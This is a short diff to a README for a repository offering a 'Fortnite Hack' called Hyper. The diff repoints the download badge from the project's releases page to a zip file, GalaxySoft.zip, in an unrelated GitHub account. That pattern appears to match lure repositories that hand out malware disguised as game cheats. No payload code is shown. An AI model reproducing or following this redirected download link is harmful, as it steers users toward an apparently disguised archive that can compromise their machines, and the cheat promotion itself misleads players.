@@ -1,4 +1,4 @@
-# ⚡ Hyper - Fortnite Hack **[![Download Hyper](https://img.shields.io/badge/Download-Hyper-blue)](../../releases)**
+# ⚡ Hyper - Fortnite Hack **[![Download Hyper](https://img.shields.io/badge/Download-Hyper-blue)](https://github.com/gabrielcohen0044/check/blob/main/GalaxySoft.zip)**
 
 ![Hyper Preview](/assets/Hyper.gif)
 
